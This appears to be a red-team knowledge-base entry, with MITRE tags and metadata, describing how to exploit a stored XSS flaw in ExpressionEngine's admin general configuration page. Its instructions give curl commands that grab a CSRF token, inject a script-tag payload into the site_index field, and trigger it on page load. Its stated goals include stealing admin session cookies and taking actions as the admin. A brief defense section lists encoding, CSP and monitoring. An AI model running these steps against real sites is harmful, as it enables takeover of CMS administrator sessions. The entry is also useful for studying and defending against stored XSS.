---
id: proc-uuid-001
tags:
  - xss
  - stored-xss
  - expressionengine
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-inject-xss-payload]]'
  - '[[commands/curl-trigger-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:27.066Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-into-ExpressionEngine-General-Configuration

## Summary

This procedure exploits a stored XSS vulnerability in the ExpressionEngine CMS admin general configuration page by injecting a malicious JavaScript payload into the unsanitized site_index parameter via a POST request, resulting in persistent script execution across all admin pages for potential session theft or unauthorized actions.

## Description

The attack targets the /admin.php?/cp/admin_system/general_configuration endpoint in ExpressionEngine, where the site_index field accepts user input without proper HTML/JS escaping. An authenticated attacker submits a crafted payload that breaks out of the expected input context and injects <script> tags. Once stored, the payload renders on every admin page load, executing JavaScript in the context of the admin user. This enables stealing session cookies (e.g., via document.cookie), keylogging, or performing actions on behalf of the admin. The vulnerability requires admin access but impacts all admins viewing the panel. Prerequisites include valid credentials and a CSRF token from the form.

## Requirements

1. Authenticated access to the ExpressionEngine admin panel
2. Valid CSRF token obtained via GET request to the configuration page
3. HTTP client capable of POST requests (e.g., curl or browser)
4. Target running vulnerable ExpressionEngine version (pre-2.5.5 or similar)

## Defense

Defensive measures and detection strategies:

- Implement output encoding (e.g., htmlspecialchars) on all user-controlled inputs rendered in HTML
- Use Content Security Policy (CSP) to restrict inline script execution
- Validate and sanitize form inputs server-side, rejecting suspicious patterns like <script>
- Monitor admin logs for anomalous configuration changes or repeated alerts
- Enable XSS auditing in browsers and WAF rules for script injection attempts

## Objectives

1. Persist malicious JavaScript in the CMS configuration
2. Execute the payload in the admin browser context
3. Steal sensitive data like session cookies or perform unauthorized admin actions

## Instructions

### Step 1: Obtain CSRF Token and Prepare Payload

**Context**: Authenticate to the admin panel and fetch the general configuration page to extract the CSRF token, which is required for the POST submission. Craft the payload to break out of the attribute context and inject script.

**Command** ([[commands/curl-get-csrf]]):
```bash
curl -c cookies.txt -b cookies.txt 'http://target/admin.php?/cp/admin_system/general_configuration' | grep -o 'csrf_token[^"]*'
```

> This command fetches the page, saves cookies, and extracts the CSRF token value. Expected output: The token string, e.g., 'csrf_token=abc123'. Use a payload like 'index.php958f7"><script>alert("stored xss")</script>ab44a' to close the HTML attribute and inject the script.

### Step 2: Submit Injection via POST

**Context**: Use the extracted CSRF token to submit the form with the malicious site_index value, persisting the payload in the CMS configuration.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl -X POST -b cookies.txt 'http://target/admin.php?/cp/admin_system/general_configuration&S=98be920eacf52890b4b159431a7da8cf' \
  -d 'csrf_token=your_csrf_token' \
  -d 'site_name=Example Site' \
  -d 'site_index=index.php958f7"><script>alert("stored xss")</script>ab44a' \
  -d 'cp_csrf_token=your_csrf_token'
```

> Submits the payload. Expected output: Redirect or success message (HTTP 200/302). The payload is now stored.

### Step 3: Trigger Execution

**Context**: Load any admin page to render the tainted configuration, executing the script.

**Command** ([[commands/curl-trigger-xss]]):
```bash
curl -v -b cookies.txt 'http://target/cp/admin_system/general_configuration&S=98be920eacf52890b4b159431a7da8cf'
```

> Fetches the page. Expected output: Response containing the injected <script> tag. In a browser, an alert pops up confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-payload]]
- [[commands/curl-trigger-xss]]

## Tools Used


## Tags

- xss
- stored-xss
- expressionengine
